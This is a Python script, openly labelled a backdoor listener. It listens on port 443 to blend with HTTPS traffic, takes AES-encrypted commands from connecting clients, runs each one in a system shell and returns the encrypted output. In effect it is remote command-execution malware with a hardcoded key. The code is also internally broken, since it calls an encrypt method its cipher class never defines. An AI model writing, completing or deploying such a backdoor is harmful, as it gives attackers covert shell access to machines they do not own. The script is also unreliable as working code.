import socket
import threading
import time
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import hashlib

# ====================== LISTENER CONFIGURATION ======================
LISTEN_IP = "0.0.0.0"  # Listen on all interfaces
LISTEN_PORT = 443      # HTTPS port for traffic blending
ENCRYPTION_KEY = b'3a7b1c9d4e2f8g5h0j6k'  # Must match backdoor
# ==================================================================

class AES128Listener:
    def __init__(self, key):
        self.key = hashlib.sha256(key).digest()[:16]  # SHA-256 then truncate to 16 bytes
        self.iv = b'\0' * 16  # Initialization vector (all zeros for simplicity)

    def decrypt(self, encrypted_data):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()

        unpadder = padding.PKCS7(128).unpadder()
        decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
        return decrypted_data.decode('utf-8', errors='ignore')

class BackdoorListener:
    def __init__(self):
        self.cipher = AES128Listener(ENCRYPTION_KEY)
        self.active_sessions = {}

    def handle_client(self, client_socket, addr):
        print(f"[+] New connection from {addr}")

        try:
            # TLS-like handshake simulation
            data = client_socket.recv(4096)
            if not data or self.cipher.decrypt(data) != "SYN":
                client_socket.close()
                return

            client_socket.sendall(self.cipher.encrypt("ACK"))
            time.sleep(0.5)

            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break

                    command = self.cipher.decrypt(data)
                    print(f"[*] Received command: {command}")

                    if command.strip().lower() == 'exit':
                        break

                    # Execute command and capture output
                    import subprocess
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10
                    )

                    # Send encrypted output
                    output = result.stdout if result.stdout else result.stderr
                    client_socket.sendall(self.cipher.encrypt(output))

                except socket.timeout:
                    continue
                except Exception as e:
                    client_socket.sendall(self.cipher.encrypt(f"Error: {str(e)}"))
                    break

        except Exception as e:
            print(f"[-] Error with {addr}: {str(e)}")
        finally:
            client_socket.close()
            print(f"[-] Connection closed: {addr}")

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((LISTEN_IP, LISTEN_PORT))
        server.listen(5)
        server.settimeout(1)

        print(f"[*] Listener started on {LISTEN_IP}:{LISTEN_PORT}")

        while True:
            try:
                client_socket, addr = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, addr),
                    daemon=True
                )
                client_thread.start()
            except socket.timeout:
                continue
            except KeyboardInterrupt:
                print("\n[!] Shutting down listener...")
                break

if __name__ == "__main__":
    listener = BackdoorListener()
    listener.start()
